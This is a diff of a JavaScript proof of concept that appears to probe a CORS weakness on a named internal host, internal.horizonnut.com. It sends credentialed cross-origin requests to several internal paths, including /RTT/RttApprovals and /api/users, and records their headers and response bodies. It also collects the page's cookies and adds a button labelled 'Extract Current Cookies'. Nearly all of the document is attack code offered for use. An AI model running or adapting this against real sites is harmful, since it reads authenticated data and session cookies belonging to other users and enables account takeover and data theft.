@@ -1,35 +1,61 @@
-<html>
-<body>
-<div id="result"></div>
-<script>
-fetch('https://internal.horizonnut.com/RTT/RttApprovals', {
+const endpoints = [
+  '/RTT/RttApprovals',
+  '/api/users',
+  '/dashboard',
+  '/settings',
+  '/reports'
+];
+
+let results = {};
+
+function logResult(endpoint, data) {
+  results[endpoint] = results[endpoint] || {};
+  Object.assign(results[endpoint], data);
+  console.log(`Updated results for ${endpoint}:`, results[endpoint]);
+  displayResults();
+}
+
+function fetchEndpoint(endpoint) {
+  fetch(`https://internal.horizonnut.com${endpoint}`, {
     method: 'GET',
     mode: 'cors',
     credentials: 'include'
-})
-.then(response => {
-    console.log('Response status:', response.status);
-    console.log('Response headers:', [...response.headers]);
-
-    let cookie = response.headers.get('Set-Cookie');
-    if (cookie) {
-        console.log('Cookie:', cookie);
-    } else {
-        console.log('No Set-Cookie header found');
-    }
-
+  }).then(response => {
+    logResult(endpoint, {
+      status: response.status,
+      headers: Object.fromEntries(response.headers.entries())
+    });
     return response.text();
-})
-.then(data => {
-    console.log('Response body:', data);
-    document.getElementById('result').textContent = data;
-})
-.catch(error => {
-    console.error('Fetch error:', error);
-    document.getElementById('result').textContent = 'Error: ' + error.message;
-});
+  }).then(data => {
+    logResult(endpoint, { body: data });
+  }).catch(error => {
+    logResult(endpoint, { error: error.toString() });
+  });
+}
 
+function displayResults() {
+  const resultDiv = document.getElementById('result');
+  resultDiv.innerHTML = '<h2>Test Results:</h2>';
+  for (const [endpoint, data] of Object.entries(results)) {
+    resultDiv.innerHTML += `
+      <h3>${endpoint}</h3>
+      <pre>${JSON.stringify(data, null, 2)}</pre>
+    `;
+  }
+}
+
+// Test all endpoints
+endpoints.forEach(fetchEndpoint);
+
+// Log document cookies
 console.log('Document cookies:', document.cookie);
-</script>
-</body>
-</html>
+logResult('document', { cookies: document.cookie });
+
+// Add a button to manually trigger cookie extraction
+const extractButton = document.createElement('button');
+extractButton.textContent = 'Extract Current Cookies';
+extractButton.onclick = () => {
+  console.log('Current document cookies:', document.cookie);
+  logResult('document', { cookies: document.cookie });
+};
+document.body.appendChild(extractButton);
